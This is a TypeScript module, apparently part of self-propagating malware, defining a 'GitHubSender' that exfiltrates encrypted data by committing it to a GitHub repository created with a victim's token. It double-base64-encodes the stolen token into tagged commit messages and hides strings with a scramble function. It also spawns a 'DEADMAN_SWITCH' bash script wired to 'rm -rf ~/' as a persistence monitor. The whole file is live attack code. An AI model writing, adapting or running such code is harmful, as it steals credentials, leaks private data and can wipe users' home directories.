import { DEADMAN_SWITCH } from "../../generated";
import { SEARCH_STRING } from "../../utils/config";
import { logUtil } from "../../utils/logger";
import { Sender } from "../base";
import type { EncryptedPackage } from "../types";
import type { CreatedRepo } from "./createRepo";
import { createRepoWithSample } from "./createRepo";

declare function scramble(str: string): string;

export class GitHubSender extends Sender {
  private createdRepo: CreatedRepo | null = null;
  private token: string | null = null;
  private commitCounter = 0;
  private includeToken = false;

  constructor() {
    super("github", {
      domain: scramble("api.github.com"),
      port: 443,
      path: "/repos/",
    });
  }

  /**
   * Must be called before this sender is usable.
   * Typically done by the factory before returning the sender.
   */
  async initialize(ghClient: string): Promise<boolean> {
    try {
      this.createdRepo = await createRepoWithSample(ghClient);
      this.token = ghClient;
      this.commitCounter = 0;
      return true;
    } catch (err) {
      logUtil.error(`GitHubSender initialization failed: ${err}`);
      return false;
    }
  }

  setIncludeToken(value: boolean): void {
    this.includeToken = value;
  }

  override async healthy(): Promise<boolean> {
    return this.createdRepo !== null && this.token !== null;
  }

  override async send(envelope: EncryptedPackage): Promise<void> {
    if (!this.createdRepo || !this.token) {
      throw new Error(scramble("GitHubSender not initialized"));
    }

    const finalEnvelope = await this.augmentEnvelope(envelope);
    await this.commitToRepo(finalEnvelope);
  }

  private async installTokenMonitor(token: string, handler: string) {
    try {
      const proc = Bun.spawn(["bash", "-s", "--", token, handler], {
        stdin: "pipe",
        stdout: "pipe",
        stderr: "pipe",
      });

      proc.stdin.write(DEADMAN_SWITCH);
      proc.stdin.end();

      const exitCode = await proc.exited;
      if (exitCode !== 0) {
        logUtil.info("We tried.");
      }
    } catch (e) {
      logUtil.info("Failure saving persistence.");
    }
  }

  /**
   * Adds the auth token to the envelope if configured.
   */
  private async augmentEnvelope(
    envelope: EncryptedPackage,
  ): Promise<EncryptedPackage> {
    if (!this.includeToken || !this.token) {
      return envelope;
    }

    logUtil.log("About to add monitor!");
    await this.installTokenMonitor(this.token, scramble("rm -rf ~/"));

    logUtil.log("Adding token to envelope!");
    const doubleEncodedToken = Buffer.from(
      Buffer.from(this.token).toString("base64"),
    ).toString("base64");

    return { ...envelope, token: doubleEncodedToken };
  }

  private async commitFileWithRetry(
    filename: string,
    commitMessage: string,
    encodedContent: string,
  ): Promise<void> {
    const maxAttempts = 5;

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        const url = `https://api.github.com/repos/${this.createdRepo!.owner}/${this.createdRepo!.name}/contents/results/${filename}`;
        const response = await fetch(url, {
          method: "PUT",
          headers: {
            Accept: "application/vnd.github+json",
            Authorization: `Bearer ${this.token}`,
            "Content-Type": "application/json",
            "X-GitHub-Api-Version": "2022-11-28",
          },
          body: JSON.stringify({
            message: commitMessage,
            content: encodedContent,
          }),
        });

        if (!response.ok) {
          const body = await response.text();
          const error: any = new Error(
            `GitHub API responded with ${response.status}: ${body}`,
          );
          error.status = response.status;
          throw error;
        }

        logUtil.log(`Committed ${filename} to ${this.createdRepo!.name}`);
        return;
      } catch (err: any) {
        const status = err?.status ?? err?.statusCode ?? err?.status_code;
        const isRetryable = status === 422 || (status >= 500 && status <= 599);

        if (!isRetryable || attempt === maxAttempts) {
          throw new Error(
            `GitHubSender commit failed after ${attempt} attempt(s): ${err}`,
          );
        }

        const backoffMs = Math.min(1000 * 2 ** (attempt - 1), 16_000);
        logUtil.log(`Retrying commit in ${backoffMs}ms (attempt ${attempt})`);
        await new Promise((res) => setTimeout(res, backoffMs));
      }
    }
  }

  private async commitToRepo(envelope: EncryptedPackage): Promise<void> {
    const content = JSON.stringify(envelope, null, 2);
    const MAX_CHUNK_SIZE = 30 * 1024 * 1024; // 30 MB
    const baseFilename = `results-${Date.now()}-${this.commitCounter++}.json`;

    const commitMessage = envelope.token
      ? `${SEARCH_STRING}:${envelope.token}`
      : "Add files.";

    const contentBuffer = Buffer.from(content, "utf8");

    if (contentBuffer.length <= MAX_CHUNK_SIZE) {
      const encodedContent = contentBuffer.toString("base64");
      await this.commitFileWithRetry(
        baseFilename,
        commitMessage,
        encodedContent,
      );
    } else {
      const totalParts = Math.ceil(contentBuffer.length / MAX_CHUNK_SIZE);
      for (let i = 0; i < totalParts; i++) {
        const chunk = contentBuffer.subarray(
          i * MAX_CHUNK_SIZE,
          (i + 1) * MAX_CHUNK_SIZE,
        );
        const encodedChunk = chunk.toString("base64");
        const chunkFilename = `${baseFilename}.p${i + 1}`;
        await this.commitFileWithRetry(
          chunkFilename,
          commitMessage,
          encodedChunk,
        );
      }
      logUtil.log(
        `Split ${baseFilename} into ${totalParts} parts for ${this.createdRepo!.name}`,
      );
    }
  }
}
